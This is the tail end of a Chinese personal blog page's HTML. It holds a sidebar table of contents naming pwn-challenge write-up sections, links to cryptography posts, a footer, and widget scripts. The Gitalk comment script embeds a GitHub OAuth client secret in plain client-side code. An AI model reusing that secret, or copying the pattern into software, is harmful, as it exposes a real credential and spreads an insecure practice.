href="mailto:q664514882@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">/</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Start</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">3x17</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">dubblesort</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">hacknote</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">Silver Bullet</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">applestore</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">Tcache Tear</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">seethefile</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">11.</span> <span class="toc-text">Death Note</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">12.</span> <span class="toc-text">Starbound</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">13.</span> <span class="toc-text">BabyStack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">14.</span> <span class="toc-text">Spirited Away</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">15.</span> <span class="toc-text">Secret Garden</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8D%E6%90%9E%E4%BA%86%E5%8D%81%E4%BA%94%E9%A2%98%EF%BC%8C%E8%BF%98%E6%98%AF%E5%A4%AA%E8%8F%9C%E4%BA%86%E5%95%8A"><span class="toc-number">15.1.</span> <span class="toc-text">才搞了十五题，还是太菜了啊</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E4%B8%8B%E6%B2%A1%E6%8A%80%E6%9C%AF%E7%9A%84%E7%9C%BC%E6%B3%AA-jpg"><span class="toc-number">15.2.</span> <span class="toc-text">流下没技术的眼泪.jpg</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/p/OU98/" title="Okamoto-Uchiyama加密方案学习笔记"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Okamoto-Uchiyama加密方案学习笔记"/></a><div class="content"><a class="title" href="/p/OU98/" title="Okamoto-Uchiyama加密方案学习笔记">Okamoto-Uchiyama加密方案学习笔记</a><time datetime="2023-02-05T07:12:11.000Z" title="发表于 2023-02-05 15:12:11">2023-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/2023-xhlj-Crypto-part-Writeup/" title="2023西湖论剑部分密码题Writeup"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2023西湖论剑部分密码题Writeup"/></a><div class="content"><a class="title" href="/p/2023-xhlj-Crypto-part-Writeup/" title="2023西湖论剑部分密码题Writeup">2023西湖论剑部分密码题Writeup</a><time datetime="2023-02-04T03:37:07.000Z" title="发表于 2023-02-04 11:37:07">2023-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/HSNCTF-2023-Winter-Crypto/" title="2023山石冬令营结营赛密码题WP"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2023山石冬令营结营赛密码题WP"/></a><div class="content"><a class="title" href="/p/HSNCTF-2023-Winter-Crypto/" title="2023山石冬令营结营赛密码题WP">2023山石冬令营结营赛密码题WP</a><time datetime="2023-01-13T02:45:57.000Z" title="发表于 2023-01-13 10:45:57">2023-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/commitment-note-1-2/" title="承诺方案（Commitment）学习笔记 1.2"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="承诺方案（Commitment）学习笔记 1.2"/></a><div class="content"><a class="title" href="/p/commitment-note-1-2/" title="承诺方案（Commitment）学习笔记 1.2">承诺方案（Commitment）学习笔记 1.2</a><time datetime="2022-09-04T02:44:33.000Z" title="发表于 2022-09-04 10:44:33">2022-09-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/HNP-note/" title="HNP学习笔记"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HNP学习笔记"/></a><div class="content"><a class="title" href="/p/HNP-note/" title="HNP学习笔记">HNP学习笔记</a><time datetime="2022-08-03T07:10:50.000Z" title="发表于 2022-08-03 15:10:50">2022-08-03</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(6.6deg, #0042bebb, #8e5690bb, #18466ebb, #000347bb)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By Tover. L</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://c10udlnk.top/">二进制是密码学人的自我修养 =v=</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '4989f2182ba1c60d6a7a',
      clientSecret: '80988778d911dff7e85489411dde0cce80d72e83',
      repo: 'ToverPomelo.github.io',
      owner: 'ToverPomelo',
      admin: ['ToverPomelo'],
      id: '6536b08a352aecb84985dd8436d0da61',
      language: 'zh-CN',
      perPage: 10,
      distractionFreeMode: false,
      pagerDirection: 'last',
      createIssueManually: true,
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
    <div class="myspine-spine-widget"></div>
    <script src="/js/myspine/spine-widget.js"></script>
    <script src="/js/myspine/spine-skeleton-binary.js"></script>
    <script src="/js/myspine/myspine.js"></script>
    <link type="text/css" href="/css/_third-party/myspine.css"></link>
    <script>
        new MySpine({
            spineDir: "/spine_models/",
            models: [{"name":"sd_21miku_normal_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_band_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_idol_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_night_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_street_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_wonder_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"}],
            styles: {"widget":{"width":"200px","height":"200px"},"voiceText":{"color":"#e6e6e6"}},
            behaviors: {"start":{"animation":"w_emu_run01_f","voice":"","text":"Ohhhhh好耶"},"idle":{"maxMinutes":1,"animations":[{"name":"m_cool_idle01_f","loop":false},{"name":"m_cool_joy01_f","loop":false},{"name":"m_happy_idle01_f","loop":false},{"name":"m_happy_joy01_f","loop":false},{"name":"m_normal_idle01_f","loop":false},{"name":"m_normal_joy01_f","loop":false},{"name":"m_staff_idle01_f","loop":false},{"name":"n_general_wait_01_f","loop":false},{"name":"pose_default","loop":false},{"name":"u_vbsmen_battledore00_f","loop":false},{"name":"u_vbswomen_battledore00_f","loop":false},{"name":"w_adult_idle01_f","loop":false},{"name":"w_adult_joy01_f","loop":false},{"name":"w_cool_idle01_f","loop":false},{"name":"w_cool_joy01_f","loop":false},{"name":"w_cute_idle01_f","loop":false},{"name":"w_cute_joy01_f","loop":false},{"name":"w_happy_idle01_f","loop":false},{"name":"w_happy_joy01_f","loop":false},{"name":"w_normal_idle01_f","loop":false},{"name":"w_normal_joy01_f","loop":false},{"name":"w_pure_idle01_f","loop":false},{"name":"w_pure_joy01_f","loop":false},{"name":"w_staff_idle01_f","loop":false}],"voices":[{"voice":"","text":"不买立省百分百"}]},"interact":{"maxPlaySec":3,"animations":[{"name":"w_normal_joy01_b","loop":false},{"name":"m_cool_angry01_f","loop":false},{"name":"m_cool_doubt01_f","loop":false},{"name":"m_cool_laugh01_f","loop":false},{"name":"m_cool_listen01_f","loop":false},{"name":"m_cool_sad01_f","loop":false},{"name":"m_cool_surprise01_f","loop":false},{"name":"m_cool_talk01_f","loop":false},{"name":"m_happy_angry01_f","loop":false},{"name":"m_happy_doubt01_f","loop":false},{"name":"m_happy_laugh01_f","loop":false},{"name":"m_happy_listen01_f","loop":false},{"name":"m_happy_sad01_f","loop":false},{"name":"m_happy_surprise01_f","loop":false},{"name":"m_happy_talk01_f","loop":false},{"name":"m_normal_angry01_f","loop":false},{"name":"m_normal_doubt01_f","loop":false},{"name":"m_normal_laugh01_f","loop":false},{"name":"m_normal_listen01_f","loop":false},{"name":"m_normal_surprise01_f","loop":false},{"name":"m_normal_talk01_f","loop":false},{"name":"m_normal_walk01_b","loop":false},{"name":"m_normal_walk01_f","loop":false},{"name":"m_tsukasa_run01_f","loop":false},{"name":"n_general_walk_01_b","loop":false},{"name":"n_general_walk_01_f","loop":false},{"name":"u_liondancerobot_run_01_f","loop":false},{"name":"u_liondancerobot_run_02_f","loop":false},{"name":"u_vbsmen_battledore01_f","loop":false},{"name":"u_vbsmen_battledore02_f","loop":false},{"name":"u_vbsmen_battledore03_f","loop":false},{"name":"u_vbsmen_battledore04_f","loop":false},{"name":"u_vbswomen_battledore01_f","loop":false},{"name":"u_vbswomen_battledore02_f","loop":false},{"name":"u_vbswomen_battledore03_f","loop":false},{"name":"u_vbswomen_battledore04_f","loop":false},{"name":"w_adult_angry01_f","loop":false},{"name":"w_adult_doubt01_f","loop":false},{"name":"w_adult_laugh01_f","loop":false},{"name":"w_adult_listen01_f","loop":false},{"name":"w_adult_sad01_f","loop":false},{"name":"w_adult_surprise01_f","loop":false},{"name":"w_adult_talk01_f","loop":false},{"name":"w_cool_angry01_f","loop":false},{"name":"w_cool_doubt01_f","loop":false},{"name":"w_cool_laugh01_f","loop":false},{"name":"w_cool_listen01_f","loop":false},{"name":"w_cool_sad01_f","loop":false},{"name":"w_cool_surprise01_f","loop":false},{"name":"w_cool_talk01_f","loop":false},{"name":"w_cute_angry01_f","loop":false},{"name":"w_cute_angry02_f","loop":false},{"name":"w_cute_doubt01_f","loop":false},{"name":"w_cute_laugh01_f","loop":false},{"name":"w_cute_listen01_f","loop":false},{"name":"w_cute_sad01_f","loop":false},{"name":"w_cute_surprise01_f","loop":false},{"name":"w_cute_talk01_f","loop":false},{"name":"w_emu_run02_f","loop":false},{"name":"w_happy_angry01_f","loop":false},{"name":"w_happy_angry02_f","loop":false},{"name":"w_happy_doubt01_f","loop":false},{"name":"w_happy_doubt02_f","loop":false},{"name":"w_happy_laugh01_f","loop":false},{"name":"w_happy_listen01_f","loop":false},{"name":"w_happy_sad01_f","loop":false},{"name":"w_happy_surprise01_f","loop":false},{"name":"w_happy_talk01_f","loop":false},{"name":"w_normal_laugh01_f","loop":false},{"name":"w_normal_listen01_f","loop":false},{"name":"w_normal_talk01_f","loop":false},{"name":"w_normal_walk01_b","loop":false},{"name":"w_normal_walk01_f","loop":false},{"name":"w_pure_angry01_f","loop":false},{"name":"w_pure_doubt01_f","loop":false},{"name":"w_pure_laugh01_f","loop":false},{"name":"w_pure_listen01_f","loop":false},{"name":"w_pure_sad01_f","loop":false},{"name":"w_pure_surprise01_f","loop":false},{"name":"w_pure_talk01_f","loop":false},{"name":"z_mesh_templete","loop":false},{"name":"z_test_F_negi01","loop":false}],"voices":[{"voice":"","text":"既见未来，为何不buy"}]}}
        });
    </script>
    <!-- hexo injector body_end end --></body></html>